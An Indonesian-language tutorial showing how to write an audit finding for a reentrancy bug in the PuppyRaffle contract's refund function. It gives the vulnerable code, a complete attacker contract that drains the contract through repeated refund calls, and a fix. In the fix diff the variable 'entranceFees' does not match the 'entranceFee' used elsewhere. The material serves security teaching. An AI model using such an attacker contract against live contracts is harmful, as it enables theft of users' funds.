# Laporan Temuan Audit: Reentrancy pada `refund` [H-1]

Materi ini membahas cara mendokumentasikan temuan Reentrancy secara profesional dalam laporan audit, mencakup deskripsi, dampak, Proof of Concept (PoC), dan rekomendasi.

## Judul Temuan
**[H-1] Serangan Reentrancy pada `PuppyRaffle::refund` memungkinkan peserta menguras saldo kontrak.**

## Deskripsi (Description)
Fungsi `PuppyRaffle::refund` tidak mengikuti pola **CEI (Checks, Effects, Interactions)**. Akibatnya, penyerang dapat melakukan panggilan balik (callback) ke fungsi `refund` sebelum status kontrak diperbarui.

Dalam kode di bawah ini, kontrak melakukan panggilan eksternal (`sendValue`) terlebih dahulu, dan baru memperbarui array `players` setelahnya:

```javascript
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

    // @Audit: Interaksi sebelum Efek (State Update)
    payable(msg.sender).sendValue(entranceFee);
    players[playerIndex] = address(0);

    emit RaffleRefunded(playerAddress);
}
```

## Dampak (Impact)
Seluruh dana yang ada di dalam kontrak (biaya pendaftaran dari peserta lain) dapat dicuri oleh peserta yang berniat jahat melalui kontrak penyerang.

## Bukti Konsep (Proof of Concept)

### Langkah-langkah Serangan:
1. Pengguna biasa masuk ke raffle.
2. Penyerang membuat kontrak dengan fungsi `fallback`/`receive` yang memanggil kembali `PuppyRaffle::refund`.
3. Penyerang masuk ke raffle.
4. Penyerang memanggil `refund` dari kontrak mereka, memicu loop reentrancy yang menguras saldo PuppyRaffle.

### Kode PoC:
```javascript
contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() public payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    fallback() external payable {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }
    
    receive() external payable {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }
}
```

## Rekomendasi (Recommendation)
Pindahkan pembaruan status (state update) dan emisi event sebelum melakukan panggilan eksternal untuk mematuhi pola CEI.

```diff
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+       players[playerIndex] = address(0);
+       emit RaffleRefunded(playerAddress);
        payable(msg.sender).sendValue(entranceFees);
-       players[playerIndex] = address(0);
-       emit RaffleRefunded(playerAddress);
    }
```
